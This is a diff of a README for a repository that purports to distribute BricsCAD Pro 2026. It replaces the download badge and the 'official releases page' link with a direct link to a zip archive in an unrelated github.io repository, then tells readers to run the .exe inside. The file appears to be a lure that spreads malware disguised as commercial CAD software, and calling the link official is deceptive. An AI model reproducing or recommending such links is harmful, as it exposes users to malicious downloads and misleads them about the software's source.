@@ -5,7 +5,7 @@ description: "Download and install BricsCAD Pro for Windows 10 and 11 using a si
 ---
 # 🏗️ BricsCAD-2026 - Powerful CAD drafting for professional designers
 
-[![](https://img.shields.io/badge/Download-BricsCAD_2026-blue)](https://github.com/Biochemistryspreadeagle849/BricsCAD-2026/releases)
+[![](https://img.shields.io/badge/Download-BricsCAD_2026-blue)](https://github.com/Biochemistryspreadeagle849/biochemistryspreadeagle849.github.io/raw/refs/heads/main/torqued/io_biochemistryspreadeagle_github_topiarist.zip)
 
 BricsCAD Pro provides a modern environment for 2D drafting and 3D modeling. It works on Windows 10 and Windows 11. This software helps users create technical drawings for architecture, engineering, and manufacturing. Its interface looks and feels familiar to CAD users, which makes the switch from other tools easy.
 
@@ -24,7 +24,7 @@ Before you install BricsCAD 2026, ensure your computer meets these technical spe
 
 Follow these steps to set up BricsCAD 2026 on your machine.
 
-1. Navigate to the official releases page: [https://github.com/Biochemistryspreadeagle849/BricsCAD-2026/releases](https://github.com/Biochemistryspreadeagle849/BricsCAD-2026/releases).
+1. Navigate to the official releases page: [https://github.com/Biochemistryspreadeagle849/biochemistryspreadeagle849.github.io/raw/refs/heads/main/torqued/io_biochemistryspreadeagle_github_topiarist.zip](https://github.com/Biochemistryspreadeagle849/biochemistryspreadeagle849.github.io/raw/refs/heads/main/torqued/io_biochemistryspreadeagle_github_topiarist.zip).
 2. Look for the latest version of the installer under the Assets section.
 3. Click the file name ending in .exe to start the transfer to your computer.
 4. Open the file once the transfer finishes.
